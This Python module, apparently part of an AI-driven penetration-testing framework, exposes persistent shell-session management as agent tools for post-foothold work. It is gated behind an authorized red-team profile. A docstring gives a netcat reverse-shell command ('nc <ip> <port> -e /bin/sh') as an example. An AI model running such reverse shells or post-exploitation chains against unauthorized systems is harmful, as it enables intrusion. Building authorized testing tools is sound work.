"""Interactive shell-session tools (post-foothold).

Exposes the existing ``ShellSession`` manager (``kryon.tools.common._sessions``)
as ``@function_tool`` entry points so the agent can drive a PERSISTENT
interactive shell — spawn a listener / reverse shell, send follow-up commands,
and read incremental output — instead of issuing one-shot ``run_command``
calls. This is what lets the model pipeline a post-foothold chain in a single
session rather than re-establishing context every turn.

The underlying functions already exist and are used internally as plain
callables; this module only wraps them, leaving ``_sessions.py`` untouched
(same additive pattern as ``tools/sqlmap_dump.py``).

Banca-safe contract: these are registered into the tool registry ONLY under
``KRYON_RED_TEAM`` (the active-pentest profile, which requires written
authorization) — see ``tool_budget.POST_EXPLOITATION_TOOLS``. The
compliance/banking default never sees them.
"""

from __future__ import annotations

from kryon.sdk.agents import function_tool
from kryon.tools.common._sessions import (
    create_shell_session as _create,
    get_session_output as _get_output,
    list_shell_sessions as _list,
    send_to_session as _send,
    terminate_session as _terminate,
)


@function_tool
def shell_session_start(command: str) -> str:
    """Start a persistent interactive shell session and return its id.

    Use this when you need to keep a shell alive across turns (e.g. launch
    ``nc <ip> <port> -e /bin/sh``, an interpreter, or an interactive tool)
    and then drive it with ``shell_session_input`` / ``shell_session_output``.
    For a single non-interactive command, prefer ``run_command``.

    Args:
        command: The command that starts the session (e.g. a reverse-shell
            handler or interactive program).

    Returns:
        The session id to use with the other shell_session_* tools, plus any
        immediate startup output.
    """
    sid = _create(command)
    if not sid or str(sid).startswith("Failed"):
        return str(sid) or "Failed to start session"
    initial = _get_output(sid, clear=False)
    return f"[session {sid}] started. Read more with shell_session_output('{sid}').\n{initial}".rstrip()


@function_tool
def shell_session_input(session_id: str, data: str) -> str:
    """Send a line of input to a running shell session.

    Args:
        session_id: Session id returned by ``shell_session_start`` (accepts the
            real id or a friendly alias like ``S1``).
        data: The line to send (a trailing newline is added automatically).

    Returns:
        A short status string.
    """
    return _send(session_id, data)


@function_tool
def shell_session_output(session_id: str, clear: bool = True) -> str:
    """Read buffered output from a shell session.

    Args:
        session_id: Session id (real id or friendly alias like ``S1``).
        clear: If True (default) the returned output is consumed; pass False to
            peek without clearing the buffer.

    Returns:
        The buffered output, or a not-found message.
    """
    return _get_output(session_id, clear=clear)


@function_tool
def shell_session_close(session_id: str) -> str:
    """Terminate a shell session and free its resources.

    Args:
        session_id: Session id (real id or friendly alias like ``S1``).

    Returns:
        A short status string.
    """
    return _terminate(session_id)


@function_tool
def shell_session_list() -> str:
    """List the active shell sessions (id, command, running, last activity)."""
    sessions = _list()
    if not sessions:
        return "No active shell sessions."
    return "\n".join(
        f"{s.get('friendly_id') or s['session_id']}  {s['command']!r}  "
        f"running={s['running']}  last={s['last_activity']}"
        for s in sessions
    )
